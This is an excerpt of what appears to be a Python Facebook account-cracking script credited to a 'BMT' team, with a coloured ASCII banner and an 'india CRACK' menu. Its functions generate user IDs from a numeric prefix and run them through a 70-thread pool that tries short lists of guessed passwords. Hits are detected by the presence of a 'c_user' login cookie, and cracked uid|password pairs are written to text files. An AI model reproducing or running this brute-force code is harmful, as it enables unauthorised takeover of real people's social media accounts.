...
logo=("""
       ...
       \033[1;32m888888b.   888b     d888 88888888888 
       \033[1;35m888  "88b  8888b   d8888     888     
       \033[1;35m888  .88P  88888b.d88888     888     
       \033[1;32m8888888K.  888Y88888P888     888     
       \033[1;32m888  "Y88b 888 Y888P 888     888     
       \033[1;35m888    888 888  Y8P  888     888     
       \033[1;35m888   d88P 888   "   888     888     
       \033[1;32m8888888P"  888       888     888         
\033[1;34m════════════════════════════════════════════════
        \033[1;36mCREATED BY   :  BARIE & MURTAZA
        \033[1;33mSTYLE        :  ALWAYS HAPPY
        \033[1;35mSYSTEM       :  DATA & WIFI
        \033[1;32mFACEBOK      :  BARIE / MURTAZA
        \033[1;34mGITHUB       :  BARIE-KHUMARI
        \033[1;36mTOOLS STATUS :  FREE
        \033[1;35mTEAM         :  BMT TEACH
...
def india():
	os.system('clear')
	print(logo)
	print('[1] india CRACK _M 1')
	print('[2] india CRACK _M 2')
	print('[3]\x1b[1;95m BACK MENU')
	lines()
	riaz1 = input('[+] SELECT OPTION : ')
	if riaz1 =='1':
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'hindustan','57575751','57273200','59039200']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('[BMT-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('BMT-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
